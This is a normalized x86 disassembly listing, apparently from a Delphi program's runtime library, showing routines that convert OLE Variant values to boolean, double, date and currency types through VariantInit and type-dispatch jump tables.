sub_410de8
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40ee44
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410e28
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410e7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f510
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410ed8
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e83
lea eax [ ebp - 0x11 ]
call sub_40f1e8
retn
sub_410e8c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415874
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410ed8
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410ef2 ]
mov eax ebx
call sub_410d20
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410d20
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410ed8
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410de8
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410e28
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40ea04
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410e8c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410de8
mov [ esp ] al
mov eax ebx
call sub_410de8
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_4110b4 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410d20
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410ed8
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_41122c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4112e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412ea0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404224
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409794
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40ee44
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40ee44
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4112e8
lea eax [ ebp - 0x1c ]
call sub_403f9c
lea eax [ ebp - 0xc ]
call sub_4046a8
retn
sub_4112f0
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40ee44
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_41133c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411391
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f510
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4113ec
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411398
lea eax [ ebp - 0x18 ]
call sub_40f1e8
retn
sub_4113a0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415874
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4113ec
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411408 ]
mov eax ebx
call sub_41122c
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_41122c
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4113ec
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4112f0
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_41133c
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40ea04
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4113a0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4112f0
fstp [ esp ]
fwait
mov eax ebx
call sub_4112f0
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4115e5 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_41122c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4113ec
fstp [ esp ]
fwait
jmp r-xdata
sub_411784
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_4118e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4113ec
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4117a6 ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40ea04
sub_411914
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4119f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412ea0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404224
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40b030
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4119f7
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0xc ]
call sub_4046a8
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404224
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_4097b0
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40ee44
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40ee44
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_411a00
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ee44
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411a60
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ee44
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411aac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411b01
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f510
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411b5c
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411b08
lea eax [ ebp - 0x18 ]
call sub_40f1e8
retn
sub_411b10
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415874
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411b5c
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411b78 ]
mov eax ebx
call sub_411914
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411a60
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411914
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411a00
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411b5c
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411a60
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411aac
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40ea04
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411b10
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411a60
fstp [ esp ]
fwait
mov eax ebx
call sub_411a60
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411d43 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411a60
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411914
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411a00
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411b5c
fstp [ esp ]
fwait
jmp r-xdata
sub_411eac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411f58
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412ea0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_404224
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409808
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411f5f
lea eax [ ebp - 0x10 ]
call sub_403f9c
lea eax [ ebp - 0xc ]
call sub_4046a8
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40ee44
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40ee44
jmp r-xdata
sub_411f68
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ee44
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411fc8
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ee44
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_412014
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412069
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f510
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4120c4
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412070
lea eax [ ebp - 0x18 ]
call sub_40f1e8
retn
sub_412078
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415874
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4120c4
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4120e0 ]
mov eax ebx
call sub_411eac
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411fc8
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411fc8
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411eac
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411f68
